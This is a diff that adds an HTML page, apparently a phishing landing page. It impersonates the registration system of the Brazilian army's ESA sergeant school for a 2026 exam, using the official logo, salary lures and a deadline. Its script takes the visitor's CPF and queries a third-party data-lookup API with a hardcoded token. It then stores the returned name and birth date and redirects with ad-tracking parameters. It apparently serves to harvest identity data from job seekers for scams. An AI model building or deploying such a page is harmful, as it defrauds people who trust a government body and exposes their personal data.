@@ -1,0 +1,313 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ESA - Inscrição 2026</title>
+
+    <script src="js/jquery-3.6.0.min.js"></script>
+
+    <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+
+    <script>
+        window.pixelId = "66875048c312882a5f833366";
+        var a = document.createElement("script");
+        a.setAttribute("async", "");
+        a.setAttribute("defer", "");
+        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+        document.head.appendChild(a);
+    </script><script async="" defer="" src="js/pixel_2.js"></script><script async="" defer="" src="js/pixel.js"></script><script async="" defer="" src="js/pixel_1.js"></script>
+    <link rel="preload" href="fonts/rawline-400.woff2" as="font" type="font/woff2" crossorigin="">
+    <link rel="preload" href="fonts/rawline-700.woff2" as="font" type="font/woff2" crossorigin="">
+
+    <link href="css/rawline.css" rel="stylesheet">
+    <script src="3.4.16"></script>
+    <link href="css/all.min.css" rel="stylesheet">
+
+    <style>
+        body {
+            font-family: 'rawline', sans-serif;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .animate-spin {
+            animation: spin 1s linear infinite;
+        }
+
+        .flasher-container {
+            position: fixed;
+            top: 10px;
+            right: 10px;
+            z-index: 9999;
+            width: 300px;
+        }
+
+        .flasher-container .flasher-message {
+            background-color: #f8d7da;
+            color: #721c24;
+            border: 1px solid #f5c6cb;
+            padding: 10px;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .flasher-container .flasher-message.success {
+            background-color: #d4edda;
+            color: #155724;
+            border: 1px solid #c3e6cb;
+        }
+    </style>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'bb-yellow': '#FEEF37',
+                        'bb-blue': '#003DA5',
+                    }
+                }
+            }
+        }
+    </script>
+</head>
+
+<body class="bg-gray-50 min-h-screen flex flex-col">
+
+    <div id="flasher-container" class="flasher-container"></div>
+
+    <div class="bg-white py-4 shadow-sm">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center text-center">
+                <img src="https://esa.eb.mil.br/images/esa_logo_1.png#joomlaImage://local-images/esa_logo_1.png?width=184&height=247" alt="Logo" class="h-12 mb-2">
+                <div>
+                    <p class="text-bb-blue text-[16px] leading-tight font-bold tracking-wide">
+                        ESA - Escola de Sargentos das Armas
+                    </p>
+                    <p class="text-bb-blue text-[12px] leading-tight tracking-wide">
+                        SELEÇÃO EXTERNA PARA O ESA
+                    </p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-bb-blue py-3 shadow-md">
+        <div class="container mx-auto px-4 flex items-center">
+            <div class="grid grid-cols-2 gap-0.5 mr-3 drop-shadow-sm">
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+                <div class="w-2 h-2 bg-white"></div>
+            </div>
+            <span class="text-white text-xl font-semibold tracking-wide drop-shadow-sm">Sistema de Inscrição</span>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 py-6">
+        <div class="bg-yellow-50 border border-yellow-100 rounded-lg p-4 mb-6 shadow-sm">
+            <div class="flex items-start">
+                <i class="fas fa-info-circle text-bb-blue text-xl mr-3 mt-0.5"></i>
+                <div>
+                    <p class="font-bold mb-2 text-bb-blue">INFORMAÇÕES IMPORTANTES</p>
+                    <p id="prazo-inscricao" class="text-sm text-gray-700 leading-relaxed">
+                        Prezado(a) Candidato(a), bem-vindo(a) ao sistema de inscrição do Concurso Público do ESA. Vagas disponíveis para os seguintes cargos:
+                    </p>
+                    <ul class="list-disc list-inside mt-2 text-sm text-gray-700 leading-relaxed ml-4">
+                        <li>Infantaria - <strong>Salário de até R$ 6.100,00</strong></li>
+                        <li>Artilharia  - <strong>Salário Inicial de R$ 7.500</strong></li>
+                    </ul><br>
+                    O <span class="font-bold">prazo para as inscrições</span>
+                    se encerra <span class="font-bold"> 04/05/2026</span>.
+                    Após esta data, <span class="font-bold">não será possível</span> realizar novas inscrições.
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container mx-auto px-4 pb-8 flex-grow">
+        <div class="bg-white rounded-lg shadow-lg p-8 border border-gray-100">
+            <div id="inscricaoForm">
+                <p class="mb-6 font-bold text-lg text-bb-blue">Dado para Inscrição:</p>
+                <div class="space-y-6">
+                    <div class="relative">
+                        <label class="block text-gray-700 text-sm font-bold mb-2" for="cpf">CPF:</label>
+                        <div class="relative">
+                            <input class="appearance-none border border-gray-300 rounded-md w-full py-2.5 px-4 text-gray-700 leading-tight focus:outline-none focus:ring-2 focus:ring-bb-blue focus:border-transparent transition duration-200" id="cpf" name="cpf" type="text" inputmode="numeric" maxlength="14" placeholder="Digite seu CPF" required="">
+                            <div class="absolute inset-y-0 right-0 flex items-center pr-3 pointer-events-none">
+                                <i class="fas fa-id-card text-gray-400"></i>
+                            </div>
+                        </div>
+                    </div>
+                    <button id="submitBtn" class="bg-bb-blue hover:bg-opacity-90 text-white font-bold py-3 px-6 rounded-md w-full flex items-center justify-center space-x-2 shadow-md hover:shadow-lg transition duration-200 mt-4">
+                        <span>Prosseguir com a Inscrição</span>
+                        <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="bg-white text-bb-black text-center py-4 mt-auto shadow-inner">
+        <p class="text-sm font-medium">© 2026 ESA. Todos os direitos reservados.</p>
+        <p class="text-sm mt-1">Central de Atendimento - 0800 725 0100</p>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const hoje = new Date();
+            const dia = String(hoje.getDate()).padStart(2, '0');
+            const mes = String(hoje.getMonth() + 1).padStart(2, '0');
+            const ano = hoje.getFullYear();
+            const dataFormatada = `hoje, ${dia}/${mes}/${ano}`;
+            document.getElementById("data-prazo").textContent = dataFormatada;
+        });
+    </script>
+
+    <script>
+        const cpfInput = document.getElementById('cpf');
+        cpfInput.addEventListener('input', function (e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+            if (value.length > 9) value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{1,2})/, '$1.$2.$3-$4');
+            else if (value.length > 6) value = value.replace(/^(\d{3})(\d{3})(\d{1,3})/, '$1.$2.$3');
+            else if (value.length > 3) value = value.replace(/^(\d{3})(\d{1,3})/, '$1.$2');
+            e.target.value = value;
+        });
+
+        cpfInput.addEventListener('keydown', function (e) {
+            if (e.key === 'Backspace' || e.key === 'Delete') {
+                let value = this.value.replace(/\D/g, '');
+                if (value.length > 0) {
+                    value = value.slice(0, -1);
+                    this.value = value; // Simplificado para evitar loop em alguns browsers
+                }
+            }
+        });
+    </script>
+
+    <script>
+        document.getElementById('submitBtn').addEventListener('click', async function (e) {
+            e.preventDefault();
+
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = submitBtn.querySelector('span');
+            const btnIcon = submitBtn.querySelector('i');
+            const cpfInput = document.getElementById('cpf');
+
+            // UI Loading
+            submitBtn.classList.add('bg-opacity-75');
+            submitBtn.disabled = true;
+            btnText.textContent = 'Processando...';
+            btnIcon.classList.remove('fa-arrow-right');
+            btnIcon.classList.add('fa-circle-notch', 'animate-spin');
+
+            function showMessage(type, message) {
+                const container = document.getElementById("flasher-container");
+                const div = document.createElement("div");
+                div.className = `flasher-message ${type}`;
+                div.textContent = message;
+                container.appendChild(div);
+                setTimeout(() => { div.remove(); }, 3000);
+            }
+
+            function resetButton() {
+                submitBtn.classList.remove('bg-opacity-75');
+                submitBtn.disabled = false;
+                btnText.textContent = 'Prosseguir com a Inscrição';
+                btnIcon.classList.remove('fa-circle-notch', 'animate-spin');
+                btnIcon.classList.add('fa-arrow-right');
+            }
+
+            if (!cpfInput.value) {
+                showMessage("error", "CPF deve ser informado.");
+                resetButton();
+                return;
+            }
+
+            const cpfValue = cpfInput.value.replace(/\D/g, "");
+
+            try {
+
+                // Chamada direta à API externa de consulta de CPF
+                const token = "c5eebbc9-0469-4324-85f6-0c994b42d18a";
+                const url = `https://api.amnesiatecnologia.rocks/?token=${encodeURIComponent(token)}&cpf=${encodeURIComponent(cpfValue)}`;
+
+                const response = await fetch(url);
+                const output = await response.json();
+
+                // Estrutura esperada da API: { "DADOS": { ... } }
+                if (output && output.DADOS) {
+
+                    const dados = output.DADOS;
+
+                    const nome = dados.nome || dados.NOME || '';
+                    let rawNasc = dados.data_nascimento || dados.DATA_NASCIMENTO || dados.NASC || dados.nascimento || '';
+
+                    // Mantém conversão caso venha em AAAA-MM-DD
+                    let nascimentoFinal = rawNasc;
+                    if (rawNasc && rawNasc.includes('-')) {
+                        const partes = rawNasc.split('-');
+                        if (partes.length === 3) {
+                            nascimentoFinal = `${partes[2]}/${partes[1]}/${partes[0]}`;
+                        }
+                    }
+
+                    // Salva no LocalStorage
+                    localStorage.setItem('cpf', cpfInput.value);
+                    localStorage.setItem('nome', nome);
+                    localStorage.setItem('nascimento', nascimentoFinal);
+
+                    /* 🔵 UTMify e Redirecionamento */
+                    function gerarUTMs() {
+                        const params = new URLSearchParams(window.location.search);
+                        let utm_source = params.get("utm_source");
+                        let utm_campaign = params.get("utm_campaign");
+                        let utm_medium = params.get("utm_medium");
+                        let utm_content = params.get("utm_content");
+                        let utm_term = params.get("utm_term");
+                        let xcod = params.get("xcod");
+
+                        if (!utm_source) {
+                            const ref = document.referrer.toLowerCase();
+                            if (ref.includes("google.")) utm_source = "google";
+                            else utm_source = "organic";
+                        }
+
+                        return `?utm_source=${encodeURIComponent(utm_source || "")}`
+                            + `&utm_campaign=${encodeURIComponent(utm_campaign || "")}`
+                            + `&utm_medium=${encodeURIComponent(utm_medium || "")}`
+                            + `&utm_content=${encodeURIComponent(utm_content || "")}`
+                            + `&utm_term=${encodeURIComponent(utm_term || "")}`
+                            + `&xcod=${encodeURIComponent(xcod || "")}`;
+                    }
+
+                    const utmsFinal = gerarUTMs();
+
+                    showMessage("success", "Dados localizados! Redirecionando...");
+
+                    setTimeout(() => {
+                        window.location.href = "../inicial/" + utmsFinal;
+                    }, 1000);
+
+                } else {
+                    showMessage("error", "CPF não localizado ou inválido.");
+                    resetButton();
+                }
+            } catch (error) {
+                console.error(error);
+                showMessage("error", "Erro ao consultar sistema. Tente novamente.");
+                resetButton();
+            }
+        });
+    </script>
+
+
+
+</body></html>
